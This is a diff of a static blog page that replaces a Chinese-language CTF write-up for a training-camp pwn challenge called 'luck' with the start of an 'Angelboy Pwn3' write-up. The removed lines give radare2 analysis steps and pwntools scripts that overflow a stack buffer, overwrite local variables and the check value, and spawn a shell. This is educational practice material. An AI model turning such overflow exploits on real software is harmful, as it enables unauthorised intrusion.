@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="MyFirstPWN 張元_Pwn-1_luck write-up, Gunjyo&#39;s Blog">
+    <meta name="keywords" content="MyFirstPWN Angelboy Pwn3 write-up, Gunjyo&#39;s Blog">
     <meta name="description" content="校園資安深耕營 PWN 張元_Pwn-1_luck write-up">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>MyFirstPWN 張元_Pwn-1_luck write-up | Gunjyo&#39;s Blog</title>
+    <title>MyFirstPWN Angelboy Pwn3 write-up | Gunjyo&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -232,7 +232,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">MyFirstPWN 張元_Pwn-1_luck write-up</h1>
+                    <h1 class="description center-align post-title">MyFirstPWN Angelboy Pwn3 write-up</h1>
                 </div>
             </div>
         </div>
@@ -394,14 +394,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    592
+                    45
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    2 Min
+                    1 Min
                 </div>
                 
 
@@ -433,58 +433,8 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <a href="/2021/08/29/Advanced-CyberSecurity-Day-Note-PWN/" title="點此回到 PWN 課程 Note">點此回到 PWN 課程 Note</a>
-
-<h2 id="Step1-執行看看"><a href="#Step1-執行看看" class="headerlink" title="Step1 - 執行看看"></a>Step1 - 執行看看</h2><p>先去執行看看，它會讓我們輸入東西<br><img src="https://i.imgur.com/x9wSaUD.png"></p>
-<h2 id="Step2-分析第一階段"><a href="#Step2-分析第一階段" class="headerlink" title="Step2 - 分析第一階段"></a>Step2 - 分析第一階段</h2><p>我們可以先用 r2 去分析第一階段要做什麼<br><img src="https://i.imgur.com/rf8z3sR.png"></p>
-<pre class=" language-bash"><code class="language-bash">$ r2 ./luck <span class="token comment" spellcheck="true">#進入 r2</span>
-<span class="token operator">></span> aa <span class="token comment" spellcheck="true">#分析</span>
-<span class="token operator">></span> afl <span class="token comment" spellcheck="true">#列出 function，其中我們可以看到 main()</span>
-<span class="token operator">></span> s main <span class="token comment" spellcheck="true">#進到 main()</span>
-<span class="token operator">></span> VV <span class="token comment" spellcheck="true">#visual mode</span>
-</code></pre>
-<h2 id="Step3-進入visual-mode"><a href="#Step3-進入visual-mode" class="headerlink" title="Step3 - 進入visual mode"></a>Step3 - 進入visual mode</h2><blockquote>
-<p>技巧：從call function 看(綠色的)</p>
-</blockquote>
-<p><img src="https://i.imgur.com/DMNnJgh.png"><br>call function 的前面(mov…)在設定 call function 的參數</p>
-<p><img src="https://i.imgur.com/dRBlWGN.png"><br>從這裡可以看到它會去比較(<code>cmp</code>)兩次，都是 true 的話會有個 “Hello hacker,now guess the password”，所以我們的目標是進入這裡</p>
-<h2 id="Step4-看一下-main-function-有哪些區域變數"><a href="#Step4-看一下-main-function-有哪些區域變數" class="headerlink" title="Step4 - 看一下 main function 有哪些區域變數"></a>Step4 - 看一下 main function 有哪些區域變數</h2><p><img src="https://i.imgur.com/cfk0L22.png"><br>將上面這些整理為 <img src="https://i.imgur.com/FjKrbOu.png" height="50%"></p>
-<blockquote>
-<p>rbp 位於藍色與綠色塊中間</p>
-</blockquote>
-<h2 id="Step5-看一下-random"><a href="#Step5-看一下-random" class="headerlink" title="Step5 - 看一下 random"></a>Step5 - 看一下 random</h2><p>可以看到 random call 完後，eax 就會回傳產出的 random 值，將它存在 <code>var_ch</code> 內</p>
-<h2 id="Step6-看一下能夠輸入多少字"><a href="#Step6-看一下能夠輸入多少字" class="headerlink" title="Step6 - 看一下能夠輸入多少字"></a>Step6 - 看一下能夠輸入多少字</h2><p><img src="https://i.imgur.com/Rxn5afJ.png"><br>在 read function 可以看到 <code>buff</code> 在<code>var_20h</code><br><code>mov edx, 0x64</code> 可以看出我們可以輸入 64 個 bytes</p>
-<p><img src="https://i.imgur.com/7F3sWAq.png"><br>從這張圖可以看到 <code>var_20h</code> ，也就是 buffer，只有 4 個 bytes，但我們卻可以輸入 64 個，因此我們可以做 overflow的大小為 64 - 4 = 60，藍色的範圍都是我們可以控制的</p>
-<h2 id="Step7-確認-address"><a href="#Step7-確認-address" class="headerlink" title="Step7 - 確認 address"></a>Step7 - 確認 address</h2><p><img src="https://i.imgur.com/kNIBURF.png"><br>從剛才的<code>cmp</code>那裡可以看到，我們須滿足下面兩個條件<br><code>local_14h = 0xfaceb00c</code><br><code>local_10h = 0xdeadbeef</code></p>
-<p>因此我們寫一個 python 去 exploit，去作出下面的結構<br><img src="https://i.imgur.com/1LSvjXw.png"></p>
-<p><img src="https://i.imgur.com/YwqSDRI.png"><br>從這裡可以看到我們輸入的地方在第三行，而第二行後還有一個<code>\n</code></p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./luck'</span><span class="token punctuation">)</span>
-
-r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 吃掉第一行</span>
-r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 吃掉第二行</span>
-
-r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xfaceb00c</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#p32(0x4->32bytes)</span>
-
-r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
-<p><img src="https://i.imgur.com/mT0WFW7.png"><br>執行後可以看到我們通過了第一階段</p>
-<h2 id="Step8-分析第二階段"><a href="#Step8-分析第二階段" class="headerlink" title="Step8 - 分析第二階段"></a>Step8 - 分析第二階段</h2><p><img src="https://i.imgur.com/EsHygvz.png"></p>
-<p><code>scanf()</code>有二個參數，第一個參數是 format，我們去看一下<br><code>s 0x400a93</code><br>然後跳到 Hex mode<br><img src="https://i.imgur.com/sEh9bKc.png"><br>在<code>0x40093</code>可以看到它吃的是<code>%d</code>(代表整數)<br>讀一個整數進來後會存到 <code>var_1ch</code><br>剛才有題到 random 會存在 <code>var_ch</code></p>
-<h2 id="STep9-寫script"><a href="#STep9-寫script" class="headerlink" title="STep9 - 寫script"></a>STep9 - 寫script</h2><p><img src="https://i.imgur.com/BErwebM.png"><br>從這裡可以看到 <code>var_1ch</code> 要等於 <code>var_ch</code><br>雖然我們不知道<code>var_ch</code>是什麼，但我們可以把它覆蓋掉阿~<br>可以把它改成<code>1</code></p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-
-r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./luck'</span><span class="token punctuation">)</span>
-
-r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 吃掉第一行</span>
-r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 吃掉第二行</span>
-
-r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xfaceb00c</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
-
-r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
-<p>接著我們輸入<code>1</code>後就可以拿到 shell 了！<br><img src="https://i.imgur.com/CxOpd3n.png"></p>
+                <p>首先先執行看看<br><img src="https://i.imgur.com/cJi8zVh.png"><br>它會讓我們先輸入一串 address<br>然後會叫我們輸入一個字串</p>
+<p>接著分析看看這個題目<br>從 main 開始看 <img src="https://i.imgur.com/8G1q8dB.png"></p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
                 
             </div>
@@ -511,7 +461,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://gunjyo0817.github.io/2021/08/29/MyFirstPWN-%E5%BC%B5%E5%85%83-Pwn-1-luck-write-up/">https://gunjyo0817.github.io/2021/08/29/MyFirstPWN-%E5%BC%B5%E5%85%83-Pwn-1-luck-write-up/</a>
+                    <a href="https://gunjyo0817.github.io/2021/08/29/MyFirstPWN-Angelboy-Pwn3-write-up/">https://gunjyo0817.github.io/2021/08/29/MyFirstPWN-Angelboy-Pwn3-write-up/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -610,72 +560,12 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2021/08/29/Advanced-CyberSecurity-Day-Note-PWN/">
+                <a href="/2021/08/29/MyFirstPWN-%E5%BC%B5%E5%85%83-Pwn-1-luck-write-up/">
                     <div class="card-image">
                         
-                        <img src="/imgs/ISIP.jpg" class="responsive-img" alt="2021 Advanced CyberSecurity Day Note - PWN">
+                        <img src="/imgs/ISIP.jpg" class="responsive-img" alt="MyFirstPWN 張元_Pwn-1_luck write-up">
                         
-                        <span class="card-title">2021 Advanced CyberSecurity Day Note - PWN</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            2021.8.28-8.29 校園資安深耕營Advanced Happy CyberSecurity Day PWN 基礎漏洞分析與測試 筆記
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-08-29
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/note/" class="post-category">
-                                    note
-                                </a>
-                            
-                            <a href="/categories/note/%E6%A0%A1%E5%9C%92%E8%B3%87%E5%AE%89%E6%B7%B1%E8%80%95%E7%87%9F/" class="post-category">
-                                    校園資安深耕營
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
-                    <a href="/tags/Note/">
-                        <span class="chip bg-color">Note</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%A0%A1%E5%9C%92%E8%B3%87%E5%AE%89%E6%B7%B1%E8%80%95%E7%87%9F/">
-                        <span class="chip bg-color">校園資安深耕營</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/08/29/MyFirstPWN-Angelboy-Pwn3-write-up/">
-                    <div class="card-image">
-                        
-                        <img src="/imgs/ISIP.jpg" class="responsive-img" alt="MyFirstPWN Angelboy Pwn3 write-up">
-                        
-                        <span class="card-title">MyFirstPWN Angelboy Pwn3 write-up</span>
+                        <span class="card-title">MyFirstPWN 張元_Pwn-1_luck write-up</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -685,9 +575,9 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-29
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-08-29
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -717,6 +607,66 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                     
                     <a href="/tags/%E6%A0%A1%E5%9C%92%E8%B3%87%E5%AE%89%E6%B7%B1%E8%80%95%E7%87%9F/">
                         <span class="chip bg-color">校園資安深耕營</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/07/22/2021-SCIST-FinalCTF-write-up/">
+                    <div class="card-image">
+                        
+                        <img src="/imgs/SCIST.jpg" class="responsive-img" alt="2021 SCIST FinalCTF write-up">
+                        
+                        <span class="card-title">2021 SCIST FinalCTF write-up</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            2021 SCIST 第一屆 資安課程季後賽 FinalCTF 的不專業 write-up，rank 1(Official)
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-22
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/write-up/" class="post-category">
+                                    write-up
+                                </a>
+                            
+                            <a href="/categories/write-up/SCIST/" class="post-category">
+                                    SCIST
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/write-up/">
+                        <span class="chip bg-color">write-up</span>
+                    </a>
+                    
+                    <a href="/tags/SCIST/">
+                        <span class="chip bg-color">SCIST</span>
                     </a>
                     
                 </div>
